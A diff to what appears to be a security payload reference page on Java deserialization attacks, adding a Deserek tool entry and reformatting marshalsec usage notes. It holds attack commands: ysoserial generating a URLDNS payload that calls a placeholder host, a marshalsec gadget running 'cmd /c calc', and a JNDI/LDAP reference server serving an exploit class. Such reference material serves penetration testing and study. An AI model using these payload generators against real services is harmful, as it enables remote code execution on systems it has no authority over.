@@ -78,19 +78,24 @@ Wicket1             @jacob-baines                          wicket-util:6.23.0, s
 - [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
 - [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
 - [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe)
+- [k3idii/Deserek](https://github.com/k3idii/Deserek)
+  ```java
+  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
+  python deserek.py yss_base.bin --format python > yss_url.py
+  python yss_url.py yss_new.bin
+  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
+  ```
 - [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Turning your data into code execution
-
-```java
-$ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
-$ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
-$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
-
--a - generates/tests all payloads for that marshaller
--t - runs in test mode, unmarshalling the generated payloads after generating them.
--v - verbose mode, e.g. also shows the generated payload in test mode.
-gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
-arguments - Gadget specific arguments
-```
+  ```java
+  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
+  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
+  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
+  // -a - generates/tests all payloads for that marshaller
+  // -t - runs in test mode, unmarshalling the generated payloads after generating them.
+  // -v - verbose mode, e.g. also shows the generated payload in test mode.
+  // gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
+  // arguments - Gadget specific arguments
+  ```
 
 Payload generators for the following marshallers are included:<br />
 
